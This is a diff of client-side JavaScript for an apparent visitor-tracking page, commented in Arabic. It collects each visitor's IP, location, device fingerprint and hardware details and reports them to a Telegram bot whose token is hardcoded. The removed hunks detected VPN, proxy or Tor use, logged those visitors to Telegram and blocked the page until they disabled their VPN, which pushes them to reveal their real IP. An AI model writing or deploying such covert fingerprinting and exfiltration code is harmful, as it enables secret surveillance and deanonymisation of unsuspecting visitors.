@@ -59,7 +59,6 @@
 // ===== الإعدادات =====
 const BOT_TOKEN = "8736282788:AAFGDokq26-1EvuwNB-o-5w01q91fL9YFXk";
 const CHAT_ID   = "8943989852";
-const VPNAPI_KEY = ""; // مفتاح vpnapi.io — حط المفتاح هنا لما يجهز
 // =====================
 
 const sessionId = Math.random().toString(36).slice(2, 10);
@@ -139,35 +138,6 @@ async function geoIP(ip) {
       tzid: k.timezone || '',
       cc: k.country || ''
     };
-  } catch (e) { return null; }
-}
-
-function vpnSignals(ipTz, ipCountry) {
-  // ملحوظة: فحص proxy/hosting عبر ip-api.com لا يعمل على HTTPS في الخطة المجانية،
-  // فالكشف هنا يعتمد على مقارنة إعدادات المتصفح بموقع الـ IP
-  const sig = { tzMismatch: false, langMismatch: false };
-  const bTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-  const lang = (navigator.language || '').toUpperCase();
-  const langCountry = lang.indexOf('-') > -1 ? lang.split('-')[1] : '';
-  if (ipTz && bTz && ipTz !== bTz) sig.tzMismatch = true;
-  if (ipCountry && langCountry && ipCountry !== langCountry) sig.langMismatch = true;
-  return sig;
-}
-
-function isVpn(sig) {
-  return sig.tzMismatch && sig.langMismatch;
-}
-
-async function vpnApiCheck(ip) {
-  if (!VPNAPI_KEY || !ip || ip === 'unknown') return null;
-  try {
-    const ctl = new AbortController();
-    const t = setTimeout(() => ctl.abort(), 6000);
-    const r = await fetch('https://vpnapi.io/api/' + encodeURIComponent(ip) + '?key=' + encodeURIComponent(VPNAPI_KEY), { signal: ctl.signal });
-    clearTimeout(t);
-    const j = await r.json();
-    const s = j.security || {};
-    return { vpn: !!s.vpn, proxy: !!s.proxy, tor: !!s.tor, relay: !!s.relay };
   } catch (e) { return null; }
 }
 
@@ -254,22 +224,6 @@ async function logVisit() {
   const d = deviceInfo();
   const g = await geoIP(ip);
   const model = await uaModel();
-  const sig = vpnSignals(g && g.tzid, g && g.cc);
-  const api = await vpnApiCheck(ip);
-  const apiHit = api && (api.vpn || api.proxy || api.tor || api.relay);
-  if (apiHit || isVpn(sig)) {
-    const reasons = [];
-    if (api) {
-      if (api.vpn) reasons.push('🔑 VPN مؤكد');
-      if (api.proxy) reasons.push('🔑 Proxy مؤكد');
-      if (api.tor) reasons.push('🔑 Tor');
-      if (api.relay) reasons.push('🔑 Relay');
-    }
-    if (isVpn(sig)) reasons.push('فرق المنطقة الزمنية واللغة عن موقع الـ IP');
-    tg(`🚫 محاولة VPN محظورة\n🆔 ${sessionId}\n🌐 IP (الظاهر): ${ip}\n📍 ${(g && g.loc) || 'n/a'}\n⚠️ السبب: ${reasons.join('، ')}\n#️⃣ fp: ${d.fp}\n💻 ${d.platform} | ${(navigator.userAgent || '').slice(0, 120)}`);
-    document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0f1420;color:#e8ecf4;font-family:system-ui;padding:20px;text-align:center" dir="rtl"><div><div style="font-size:52px;margin-bottom:14px">🚫</div><div style="font-size:20px;font-weight:700;margin-bottom:8px">تم رصد اتصال VPN</div><div style="color:#9aa5bd;font-size:14px;line-height:1.8">من فضلك أغلق الـ VPN<br>وأعد تحميل الصفحة للمتابعة</div></div></div>';
-    return;
-  }
   const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
   const gpu = webglInfo();
   const net = netInfo();
